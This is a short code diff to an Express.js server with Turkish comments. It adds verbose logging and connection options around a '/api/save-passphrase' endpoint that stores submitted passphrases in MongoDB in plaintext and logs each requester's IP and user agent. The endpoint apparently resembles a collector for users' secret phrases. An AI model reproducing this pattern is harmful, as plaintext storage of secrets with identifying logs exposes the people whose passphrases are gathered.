@@ -8,9 +8,19 @@ dotenv.config();
 const app = express();
 
 // MongoDB bağlantısı
-mongoose.connect(process.env.MONGODB_URI)
-  .then(() => console.log('MongoDB connected'))
-  .catch(err => console.error('MongoDB connection error:', err));
+mongoose.connect(process.env.MONGODB_URI, {
+  useNewUrlParser: true,
+  useUnifiedTopology: true,
+})
+.then(() => console.log('MongoDB connected successfully'))
+.catch(err => {
+  console.error('MongoDB connection error details:', {
+    message: err.message,
+    code: err.code,
+    name: err.name,
+    stack: err.stack
+  });
+});
 
 // CORS ve diğer middleware'ler
 app.use((req, res, next) => {
@@ -30,9 +40,15 @@ app.use(express.static(path.join(__dirname, 'build')));
 
 // Passphrase kaydetme endpoint'i
 app.post('/api/save-passphrase', async (req, res) => {
+  console.log('Received passphrase request:', {
+    ip: req.ip,
+    userAgent: req.get('User-Agent')
+  });
+  
   const { passphrase } = req.body;
   
   try {
+    console.log('Attempting to save passphrase...');
     // Aynı passphrase'in daha önce kaydedilip kaydedilmediğini kontrol et
     const existingPassphrase = await Passphrase.findOne({ passphrase });
     
@@ -56,8 +72,14 @@ app.post('/api/save-passphrase', async (req, res) => {
     }
 
     res.json({ success: true });
+    console.log('Passphrase saved successfully');
   } catch (error) {
-    console.error('Error saving passphrase:', error);
+    console.error('Detailed save error:', {
+      message: error.message,
+      code: error.code,
+      name: error.name,
+      stack: error.stack
+    });
     
     // MongoDB duplicate key hatası
     if (error.code === 11000) {
